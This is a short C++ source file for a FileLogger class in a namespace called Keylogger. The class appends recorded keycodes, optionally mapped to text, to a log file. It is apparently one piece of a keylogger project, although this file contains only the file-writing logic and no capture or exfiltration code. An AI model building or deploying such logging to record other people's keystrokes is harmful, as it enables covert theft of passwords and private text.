#include "FileLogger.h"

namespace Keylogger {

bool FileLogger::open(IKeycodeMapper* mapper, std::string filename) {
	_mapper = mapper;
	_stream.open(filename, std::ios_base::app);
	
	return _stream.is_open();
}

void FileLogger::close() {
	_stream.close();
}

void FileLogger::logKeycode(int keycode, int state) {
	if (_mapper) {
		std::cout << _mapper->keycodeToStr(keycode) << std::endl;
		_stream << _mapper->keycodeToStr(keycode);
	} else {
		_stream << keycode << ":" << state << " ";
	}
}

}
